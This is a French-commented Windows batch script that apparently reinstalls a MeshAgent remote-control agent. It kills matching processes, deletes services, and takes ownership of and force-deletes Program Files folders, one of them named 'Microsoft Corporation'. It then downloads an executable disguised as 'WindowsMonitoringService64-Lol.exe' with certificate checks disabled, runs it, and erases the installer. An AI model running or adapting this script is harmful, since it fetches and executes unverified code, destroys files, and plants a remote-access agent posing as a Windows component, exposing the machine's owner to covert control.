@echo off
setlocal enabledelayedexpansion

:: Configuration
set "LDIR=C:\Temp"
set "LFILE=%LDIR%\agent_maintenance.log"
set "URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe"
set "T_EXE=%TEMP%\WindowsMonitoringService64-Lol.exe"

if not exist "%LDIR%" mkdir "%LDIR%"
echo [START] %DATE% %TIME% > "%LFILE%"

:: 1. Vérification Admin
net session >nul 2>&1 || (echo [ERREUR] Droits admin requis >> "%LFILE%" & exit /b 1)

:: 2. Identification dynamique et arrêt
echo [2] Recherche et arret des processus... >> "%LFILE%"
:: On cherche les processus actifs dans les dossiers suspects pour trouver le "bon nom"
for /f "tokens=2 delims=," %%P in ('tasklist /fi "STATUS eq running" /nh /fo csv') do (
    set "proc=%%~P"
    :: On vérifie si le processus vient d'un dossier Mesh ou LGTW
    wmic process where "name='!proc!'" get ExecutablePath 2>nul | findstr /i "Mesh LGTW Monitoring" >nul
    if !errorlevel! equ 0 (
        echo [INFO] Processus identifie : !proc! >> "%LFILE%"
        taskkill /F /IM "!proc!" /T >> "%LFILE%" 2>&1
    )
)

:: 3. Désinstallation via les outils Windows (sc & désinstalleurs)
echo [3] Desinstallation complete... >> "%LFILE%"
:: On cherche tous les services qui pourraient être liés
for /f "tokens=2 delims= " %%s in ('sc query state^= all ^| findstr /i "Mesh LGTW Monitoring WindowsMonitoring"') do (
    echo [INFO] Suppression du service : %%s >> "%LFILE%"
    sc stop "%%s" >> "%LFILE%" 2>&1
    sc delete "%%s" >> "%LFILE%" 2>&1
)

:: 4. Nettoyage physique des dossiers Program Files
echo [4] Nettoyage des dossiers... >> "%LFILE%"
set "DIRS="%ProgramFiles%\Mesh Agent" "%ProgramFiles%\LGTW" "%ProgramFiles(x86)%\Mesh Agent" "%ProgramFiles%\Microsoft Corporation""

for %%D in (%DIRS%) do (
    if exist "%%~D" (
        takeown /f "%%~D" /r /d y >> "%LFILE%" 2>&1
        icacls "%%~D" /grant administrators:F /t >> "%LFILE%" 2>&1
        rd /s /q "%%~D" >> "%LFILE%" 2>&1
        echo [OK] Nettoyage de %%~D >> "%LFILE%"
    )
)

:: 5. Téléchargement et Réinstallation Propre
echo [5] Telechargement du nouvel agent... >> "%LFILE%"
curl -L -k -f -o "%T_EXE%" "%URL%" >> "%LFILE%" 2>&1

if not exist "%T_EXE%" (
    echo [ERREUR] Impossible de recuperer l'executable. >> "%LFILE%"
    goto :final
)

echo [6] Installation avec --fullinstall... >> "%LFILE%"
:: On lance l'installation complète
start "" "%T_EXE%" --fullinstall
echo [OK] Commande d'installation envoyee. >> "%LFILE%"

:: 7. Nettoyage final de l'installateur
timeout /t 15 /nobreak >nul
if exist "%T_EXE%" del /f /q "%T_EXE%" >> "%LFILE%" 2>&1

:final
echo [END] %DATE% %TIME% >> "%LFILE%"
echo -------------------------- >> "%LFILE%"
exit /b 0
